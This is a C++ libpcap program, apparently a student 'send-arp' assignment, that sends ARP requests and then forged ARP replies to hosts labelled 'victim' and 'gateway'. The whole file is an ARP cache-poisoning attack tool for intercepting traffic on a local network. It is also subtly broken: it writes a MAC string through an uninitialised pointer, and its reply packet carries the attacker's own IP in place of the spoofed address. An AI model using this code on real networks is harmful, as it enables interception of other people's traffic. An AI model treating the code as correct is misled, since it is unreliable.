#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netinet/ether.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

char* getIPAddress(const char* interface) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) {
        perror("socket");
        return NULL;
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);

    if (ioctl(sock, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl");
        close(sock);
        return NULL;
    }

    close(sock);

    return strdup(inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
}

char* getMacAddress(const char *interface) {
    int sockfd;
    struct ifreq ifr;
    char *macAddress = (char*)malloc(18); // MAC 주소의 길이는 17바이트 + NULL 문자(\0) 1바이트

    if (macAddress == NULL) {
        perror("메모리 할당 실패");
        exit(1);
    }

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        free(macAddress); // 할당된 메모리 해제
        return NULL;
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sockfd);
        free(macAddress); // 할당된 메모리 해제
        return NULL;
    }

    close(sockfd);

    sprintf(macAddress, "%02X:%02X:%02X:%02X:%02X:%02X",
            (unsigned char)ifr.ifr_hwaddr.sa_data[0],
            (unsigned char)ifr.ifr_hwaddr.sa_data[1],
            (unsigned char)ifr.ifr_hwaddr.sa_data[2],
            (unsigned char)ifr.ifr_hwaddr.sa_data[3],
            (unsigned char)ifr.ifr_hwaddr.sa_data[4],
            (unsigned char)ifr.ifr_hwaddr.sa_data[5]);

    return macAddress;
}

int main(int argc, char* argv[]) {
	if (argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char* My_ip = getIPAddress(dev);
	char* My_mac = getMacAddress(dev);

	for (int i=2; i<argc; i+=2){
		char *sender_ip = argv[i]; // victim
		char *target_ip = argv[i+1]; // gateway
		
		EthArpPacket Request_packet;

		Request_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		Request_packet.eth_.smac_ = Mac(My_mac);
		Request_packet.eth_.type_ = htons(EthHdr::Arp);

		Request_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		Request_packet.arp_.pro_ = htons(EthHdr::Ip4);
		Request_packet.arp_.hln_ = Mac::SIZE;
		Request_packet.arp_.pln_ = Ip::SIZE;
		Request_packet.arp_.op_ = htons(ArpHdr::Request);
		Request_packet.arp_.smac_ = Mac(My_mac);
		Request_packet.arp_.sip_ = htonl(Ip(target_ip));
		Request_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		Request_packet.arp_.tip_ = htonl(Ip(sender_ip));

		int Request_res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Request_packet), sizeof(EthArpPacket));
		if (Request_res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", Request_res, pcap_geterr(handle));
		}

		//sender mac address
		char* sender_mac;

		struct pcap_pkthdr* header;
		const u_char* pkt_data;
		int res_recv = pcap_next_ex(handle, &header, &pkt_data);
		if (res_recv == 0) continue;
		if (res_recv == PCAP_ERROR || res_recv == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res_recv, pcap_geterr(handle));
			break;
		}
		struct ethhdr* eth_hdr = (struct ethhdr*)(pkt_data);
		sprintf(sender_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
				eth_hdr->h_source[0], eth_hdr->h_source[1], eth_hdr->h_source[2],
				eth_hdr->h_source[3], eth_hdr->h_source[4], eth_hdr->h_source[5]);

		EthArpPacket Reply_packet;

		Reply_packet.eth_.dmac_ = Mac(sender_mac);
		Reply_packet.eth_.smac_ = Mac(My_mac);
		Reply_packet.eth_.type_ = htons(EthHdr::Arp);

		Reply_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		Reply_packet.arp_.pro_ = htons(EthHdr::Ip4);
		Reply_packet.arp_.hln_ = Mac::SIZE;
		Reply_packet.arp_.pln_ = Ip::SIZE;
		Reply_packet.arp_.op_ = htons(ArpHdr::Reply);
		Reply_packet.arp_.smac_ = Mac(My_mac);
		Reply_packet.arp_.sip_ = htonl(Ip(My_ip));
		Reply_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		Reply_packet.arp_.tip_ = htonl(Ip(target_ip));

		int Reply_res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Reply_packet), sizeof(EthArpPacket));

		if (Reply_res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", Reply_res, pcap_geterr(handle));
		}
	}
	pcap_close(handle);
}
